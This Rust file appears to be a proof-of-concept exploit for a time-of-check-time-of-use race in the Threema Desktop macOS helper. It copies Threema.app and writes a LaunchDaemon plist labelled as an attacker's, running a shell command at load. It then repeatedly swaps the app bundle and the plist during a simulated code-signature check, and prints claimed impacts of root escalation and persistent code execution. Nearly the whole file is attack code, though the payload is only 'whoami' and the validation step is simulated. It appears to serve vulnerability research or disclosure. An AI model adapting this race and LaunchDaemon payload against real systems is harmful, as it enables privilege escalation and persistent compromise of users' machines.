//! Full TOCTOU Proof of Concept
//!
//! This demonstrates the complete race condition attack against the Threema helper.
//!
//! Compile with:
//!   rustc --edition 2021 -L /path/to/threema/target/debug/deps poc-toctou-full.rs
//!
//! Run with:
//!   ./poc-toctou-full [--aggressive]

use std::{
    fs, io, path::{Path, PathBuf},
    process::Command,
    sync::{atomic::{AtomicBool, AtomicUsize, Ordering}, Arc},
    thread, time::Duration,
};

/// Configuration for the race condition
#[derive(Debug, Clone)]
pub struct RaceConfig {
    /// Number of race attempts
    pub attempts: usize,
    /// Sleep time between swaps (microseconds)
    pub swap_interval_us: u64,
    /// Duration of "malicious" state before swapping back (ms)
    pub malicious_hold_ms: u64,
    /// Validation simulation duration (ms) - simulates SecStaticCodeCheckValidityWithErrors
    pub validation_duration_ms: u64,
    /// Enable aggressive mode (more swaps, tighter timing)
    pub aggressive: bool,
}

impl Default for RaceConfig {
    fn default() -> Self {
        Self {
            attempts: 50,
            swap_interval_us: 1000,      // 1ms between swaps
            malicious_hold_ms: 20,       // Hold malicious state for 20ms
            validation_duration_ms: 150, // Simulate 150ms validation
            aggressive: false,
        }
    }
}

/// Main race condition test
pub struct ToctouTest {
    config: RaceConfig,
    test_dir: PathBuf,
    payload_path: PathBuf,
    malicious_path: PathBuf,
    success_count: Arc<AtomicUsize>,
}

impl ToctouTest {
    pub fn new(config: RaceConfig) -> io::Result<Self> {
        // Create test directory
        let test_dir = PathBuf::from(format!("/tmp/threema-toctou-{}", std::process::id()));

        if test_dir.exists() {
            fs::remove_dir_all(&test_dir)?;
        }
        fs::create_dir_all(&test_dir)?;

        let payload_path = test_dir.join("payload.app");
        let malicious_path = test_dir.join("malicious.plist");

        println!("[+] Test directory: {}", test_dir.display());

        Ok(Self {
            config,
            test_dir,
            payload_path,
            malicious_path,
            success_count: Arc::new(AtomicUsize::new(0)),
        })
    }

    /// Prepare test payload
    pub fn setup(&self) -> io::Result<()> {
        println!("[+] Setting up test environment...");

        // Check Threema.app exists
        if !Path::new("/Applications/Threema.app").exists() {
            return Err(io::Error::new(
                io::ErrorKind::NotFound,
                "Threema.app not found in /Applications",
            ));
        }

        // Copy valid Threema.app
        println!("[+] Copying Threema.app to payload directory...");
        copy_recursive("/Applications/Threema.app", &self.payload_path)?;

        // Create malicious plist
        println!("[+] Creating malicious LaunchDaemon plist...");
        let plist_content = r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.attacker.threema-poc</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>whoami > /tmp/threema-poc-whoami.txt 2>&amp;1</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"#;

        fs::write(&self.malicious_path, plist_content)?;
        println!("[+] Malicious plist created: {}", self.malicious_path.display());

        Ok(())
    }

    /// Run the race condition attack
    pub fn execute_race(&self) -> io::Result<RaceResult> {
        println!("[*] Executing race condition test...");
        println!("[*] Configuration:");
        println!("    - Attempts: {}", self.config.attempts);
        println!("    - Swap interval: {}μs", self.config.swap_interval_us);
        println!("    - Malicious hold: {}ms", self.config.malicious_hold_ms);
        println!("    - Validation simulation: {}ms", self.config.validation_duration_ms);
        println!("    - Aggressive mode: {}", self.config.aggressive);
        println!("");

        let success_count = Arc::clone(&self.success_count);
        let payload = self.payload_path.clone();
        let malicious = self.malicious_path.clone();
        let attempts = self.config.attempts;
        let swap_interval = self.config.swap_interval_us;
        let hold_time = self.config.malicious_hold_ms;
        let aggressive = self.config.aggressive;

        // Spawn race thread
        let race_handle = thread::spawn(move || {
            for attempt in 0..attempts {
                // Swap: app → plist
                let _ = fs::rename(&payload, format!("{}.tmp", payload.display()));
                let _ = fs::rename(&malicious, &payload);

                // Hold in malicious state
                let hold_duration = if aggressive {
                    Duration::from_millis(hold_time * 2)
                } else {
                    Duration::from_millis(hold_time)
                };
                thread::sleep(hold_duration);

                // Swap back
                let _ = fs::rename(&payload, &malicious);
                let _ = fs::rename(format!("{}.tmp", payload.display()), &payload);

                // Small delay before next iteration
                thread::sleep(Duration::from_micros(swap_interval));

                if attempt % 10 == 0 {
                    print!(".");
                    std::io::Write::flush(&mut std::io::stdout()).ok();
                }
            }
            println!("");
        });

        // Simulate validation (blocking operation in helper)
        println!("[*] Simulating SecStaticCodeCheckValidityWithErrors() blocking...");
        let validation_start = std::time::Instant::now();
        thread::sleep(Duration::from_millis(self.config.validation_duration_ms));
        let validation_elapsed = validation_start.elapsed();

        println!("[+] Validation simulation completed: {:.2}ms", validation_elapsed.as_secs_f64() * 1000.0);

        // Wait for race thread
        race_handle.join().unwrap();

        // Check result: is payload now a plist?
        println!("[*] Checking race condition result...");

        let is_plist = self.check_if_plist(&self.payload_path)?;
        if is_plist {
            success_count.fetch_add(1, Ordering::SeqCst);
            println!("[!] ✓ RACE CONDITION SUCCEEDED!");
            println!("[!]   payload.app is now a PLIST file");
            println!("[!]   Helper would write this to /Library/LaunchDaemons/ as root");
        } else {
            println!("[*] Race condition did not trigger in this attempt");
        }

        Ok(RaceResult {
            total_attempts: attempts,
            successful_races: success_count.load(Ordering::SeqCst),
            success_rate: (success_count.load(Ordering::SeqCst) as f64 / attempts as f64) * 100.0,
        })
    }

    /// Check if file is a plist
    fn check_if_plist(&self, path: &Path) -> io::Result<bool> {
        if !path.exists() {
            return Ok(false);
        }

        let metadata = fs::metadata(path)?;

        // If it's a directory, it's the app (race failed)
        if metadata.is_dir() {
            return Ok(false);
        }

        // If it's a file, check if it's XML (plist)
        if metadata.is_file() {
            let content = fs::read_to_string(path)?;
            Ok(content.contains("<?xml") || content.contains("<plist"))
        } else {
            Ok(false)
        }
    }

    /// Cleanup test files
    pub fn cleanup(&self) -> io::Result<()> {
        println!("[+] Cleaning up test directory...");
        if self.test_dir.exists() {
            fs::remove_dir_all(&self.test_dir)?;
        }
        Ok(())
    }
}

#[derive(Debug)]
pub struct RaceResult {
    pub total_attempts: usize,
    pub successful_races: usize,
    pub success_rate: f64,
}

fn copy_recursive(src: &str, dst: &Path) -> io::Result<()> {
    let output = Command::new("cp")
        .args(&["-R", src, &dst.to_string_lossy()])
        .output()?;

    if !output.status.success() {
        return Err(io::Error::new(
            io::ErrorKind::Other,
            format!("Failed to copy: {}", String::from_utf8_lossy(&output.stderr)),
        ));
    }

    Ok(())
}

fn main() -> io::Result<()> {
    println!("╔════════════════════════════════════════════════════╗");
    println!("║  Threema Desktop macOS Helper TOCTOU POC           ║");
    println!("║  Time-of-Check-Time-of-Use Race Condition          ║");
    println!("╚════════════════════════════════════════════════════╝");
    println!("");

    let aggressive = std::env::args().any(|arg| arg == "--aggressive");

    let mut config = RaceConfig::default();
    if aggressive {
        config.aggressive = true;
        config.swap_interval_us = 500;
        config.malicious_hold_ms = 50;
        config.validation_duration_ms = 200;
        config.attempts = 100;
        println!("[*] Running in AGGRESSIVE mode");
        println!("");
    }

    let mut test = ToctouTest::new(config.clone())?;
    test.setup()?;

    // Run multiple test iterations
    let mut total_successes = 0;
    let num_iterations = if aggressive { 3 } else { 1 };

    for i in 1..=num_iterations {
        println!("[*] Test Iteration {}/{}", i, num_iterations);
        println!("");

        let result = test.execute_race()?;

        println!("");
        println!("═══════════════════════════════════════════════════");
        println!("RESULTS (Iteration {}):", i);
        println!("═══════════════════════════════════════════════════");
        println!("Total Attempts:   {}", result.total_attempts);
        println!("Successful Races: {}", result.successful_races);
        println!("Success Rate:     {:.1}%", result.success_rate);
        println!("");

        total_successes += result.successful_races;
    }

    // Overall results
    println!("═══════════════════════════════════════════════════");
    println!("OVERALL RESULTS:");
    println!("═══════════════════════════════════════════════════");
    let total_attempts = config.attempts * num_iterations;
    let overall_rate = (total_successes as f64 / total_attempts as f64) * 100.0;

    println!("Total Attempts:      {}", total_attempts);
    println!("Successful Races:    {}", total_successes);
    println!("Overall Success Rate: {:.1}%", overall_rate);
    println!("");

    if total_successes > 0 {
        println!("[!]   VULNERABILITY CONFIRMED");
        println!("[!] TOCTOU race condition successfully demonstrated!");
        println!("[!]");
        println!("[!] Impact: An attacker with code execution in Threema can:");
        println!("[!] • Escalate privileges from user → root");
        println!("[!] • Write malicious LaunchDaemon as root");
        println!("[!] • Achieve persistent code execution");
        println!("[!] • Compromise the entire system");
        println!("");
    }

    test.cleanup()?;

    Ok(())
}
